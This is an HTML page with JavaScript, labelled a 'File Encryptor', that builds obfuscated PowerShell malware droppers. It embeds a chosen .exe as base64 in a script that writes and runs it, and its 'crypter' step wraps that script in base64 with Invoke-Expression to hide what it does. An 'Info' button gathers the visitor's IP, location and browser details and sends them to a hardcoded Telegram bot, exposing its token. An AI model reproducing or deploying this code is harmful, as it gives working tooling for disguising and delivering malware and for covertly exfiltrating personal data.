<<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Encryptor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #6a11cb, #2575fc); /* Gradient background */
            color: white; /* White text color */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        h1 {
            margin-bottom: 20px;
            font-size: 2.5rem; /* Larger title */
        }
        .container {
            display: flex;
            flex-direction: row;
            justify-content: space-around;
            width: 100%;
            max-width: 800px; /* Maximum width */
            padding: 20px;
            border-radius: 15px;
            background-color: rgba(0, 0, 0, 0.7); /* Dark semi-transparent background */
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
        }
        .box {
            background-color: rgba(255, 255, 255, 0.1); /* Slightly transparent box */
            border-radius: 10px;
            padding: 20px;
            margin: 10px;
            width: 45%;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        button {
            padding: 15px 20px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px 0;
            background-color: #ff4757; /* Red color */
            color: white; /* Button text color */
            transition: background-color 0.3s, transform 0.2s;
            width: 100%;
        }
        button:hover {
            background-color: #ff6b81; /* Lighter red on hover */
            transform: scale(1.05); /* Slightly enlarge on hover */
        }
        input[type="file"] {
            display: none; /* Hides the file input */
        }
        label {
            background-color: #3742fa; /* Blue button for file selection */
            padding: 15px;
            border-radius: 5px;
            color: white;
            cursor: pointer;
            display: inline-block;
            margin: 10px 0;
            transition: background-color 0.3s;
        }
        label:hover {
            background-color: #5f27cd; /* Lighter blue on hover */
        }
        #ps-output {
            border: 1px solid white;
            padding: 10px;
            display: inline-block;
            width: 100%;
            word-wrap: break-word;
            color: #ffeb3b;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <h1>File Encryptor</h1>
    <div class="container">
        <div class="box" id="file-selection-box">
            <h2>Choose the File</h2>
            <label id="choose-file-button" for="file-input">Choose File</label>
            <input type="file" id="file-input" accept=".exe" />
            <div id="file-name">No file chosen</div>
        </div>

        <div class="box" id="ps1-generation-box">
            <h2>PS1 Generation</h2>
            <button id="generate-ps-button" onclick="generatePSScript()">Generate PS1 Code</button>
            <div id="ps-output">PowerShell Code: Click to Generate</div>
            <button id="copy-ps-button" onclick="copyPSScript()">Copy PS1 Script</button>
            <button id="info-button" onclick="sendUserInfo()">Info</button>
            <button id="crypt-button" onclick="createCrypter()">PowerShell Crypter</button>
        </div>
    </div>

    <script>
        let selectedFile;
        let finalPSCode = '';

        document.getElementById("file-input").addEventListener("change", function() {
            const fileNameDisplay = document.getElementById("file-name");
            if (this.files.length > 0) {
                selectedFile = this.files[0];
                fileNameDisplay.textContent = selectedFile.name;
            } else {
                fileNameDisplay.textContent = "No file chosen";
            }
        });

        function generatePSScript() {
            if (!selectedFile) {
                alert("Please choose a file first.");
                return;
            }

            const reader = new FileReader();
            reader.onload = function(event) {
                const base64String = event.target.result.split(',')[1];
                finalPSCode = `
                $base64 = "${base64String}";
                [System.IO.File]::WriteAllBytes("executable.exe", [System.Convert]::FromBase64String($base64));
                Start-Process -FilePath "executable.exe";
                `;
                document.getElementById("ps-output").textContent = "PowerShell Code: " + finalPSCode.trim().substring(0, 50) + '...';
            };

            reader.readAsDataURL(selectedFile);
        }

        function copyPSScript() {
            navigator.clipboard.writeText(finalPSCode).then(() => {
                alert("PowerShell script copied to clipboard!");
            }).catch(err => {
                console.error('Error copying to clipboard: ', err);
            });
        }

        async function sendUserInfo() {
            console.log("Sending user info...");

            const userInfo = {
                userAgent: navigator.userAgent,
                wifi: navigator.connection.effectiveType || "unknown"
            };

            try {
                console.log("Fetching location data...");
                const response = await fetch('https://ipapi.co/json/');
                if (!response.ok) throw new Error('Failed to fetch location data');
                
                const data = await response.json();
                userInfo.ip = data.ip || "unknown";
                userInfo.city = data.city || "unknown";
                userInfo.region = data.region || "unknown";
                userInfo.country = data.country || "unknown";

                console.log("Location data fetched:", userInfo);
            } catch (error) {
                console.error('Error fetching location data:', error);
                alert('Could not retrieve location data. Please check your connection.');
                return;
            }

            const token = '7247835860:AAHi08y99fZPkS1Drd8-xwtv0ZnO3pgDOqM';
            const chatId = '842463450';
            const message = `User Info: ${JSON.stringify(userInfo)}`;

            try {
                console.log("Sending message to Telegram...");
                const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });
                
                const result = await telegramResponse.json();
                if (result.ok) {
                    alert('Information sent to Telegram!');
                } else {
                    alert('Error sending information: ' + result.description);
                }
            } catch (err) {
                console.error('Error:', err);
                alert('Error sending information to Telegram. Please check your connection.');
            }
        }

        function createCrypter() {
            if (!finalPSCode) {
                alert("Please generate PowerShell code first.");
                return;
            }

            // Compacting the PowerShell script
            const encodedCode = btoa(finalPSCode); // Base64 encoding
            const psFileContent = `$command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${encodedCode}')); Invoke-Expression $command;`;

            // Create a downloadable .ps1 file
            const blob = new Blob([psFileContent], { type: 'application/octet-stream' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'encrypted_script.ps1';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            alert("Encrypted PowerShell script downloaded!");
        }
    </script>

</body>
</html>
